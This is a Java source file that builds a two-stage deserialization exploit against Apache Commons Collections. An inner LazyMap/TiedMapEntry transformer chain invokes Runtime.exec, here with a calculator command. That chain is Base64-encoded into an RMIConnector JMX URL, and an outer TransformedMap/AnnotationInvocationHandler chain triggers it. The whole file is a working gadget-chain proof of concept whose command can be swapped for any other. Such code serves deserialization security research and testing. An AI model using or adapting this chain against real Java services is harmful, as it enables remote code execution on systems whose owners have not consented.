package org.example;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;

import java.lang.annotation.Target;

import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;

import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class Rmiconnector_TransformedMap_twice {
    public static void main(String[] args) throws Exception {
        ByteArrayOutputStream tser = new ByteArrayOutputStream();
        ObjectOutputStream toser = new ObjectOutputStream(tser);
        toser.writeObject(getObject());
        toser.close();
//序列化内层的payload
        String exp = Base64.getEncoder().encodeToString(tser.toByteArray());

        JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi://");
        setFieldValue(jmxServiceURL, "urlPath", "/stub/" + exp);
        RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null);
        InvokerTransformer invokerTransformer = new InvokerTransformer("connect", null, null);

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(rmiConnector),
                new InvokerTransformer("connect", null, null)
        };
        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);

        HashMap<Object, Object> map = new HashMap<>();
        Map outmap = TransformedMap.decorate(map, null,chainedTransformer);
        outmap.put("test","text");
//Runtime.getRuntime().exec("");
        Class test = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct=test.getDeclaredConstructor(Class.class,Map.class);
        construct.setAccessible(true);
        Object obj = construct.newInstance(Target.class,outmap);


        serialize(obj);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }



    public static void setFieldValue(Object obj,String name,Object value)throws Exception {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static HashMap getObject() throws Exception{
        Transformer[] transformers = new Transformer[]{
                new org.apache.commons.collections.functors.ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        Map<Object,Object> lazymap = LazyMap.decorate(map,new org.apache.commons.collections.functors.ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,"aaa");
        HashMap<Object,Object> map2 = new HashMap<>();
        map2.put(tiedMapEntry,"bbb");
        lazymap.remove("aaa");
        Class lazyMapClass = LazyMap.class;
        Field factoryField = lazyMapClass.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazymap,chainedTransformer);
        return map2;
    }
}
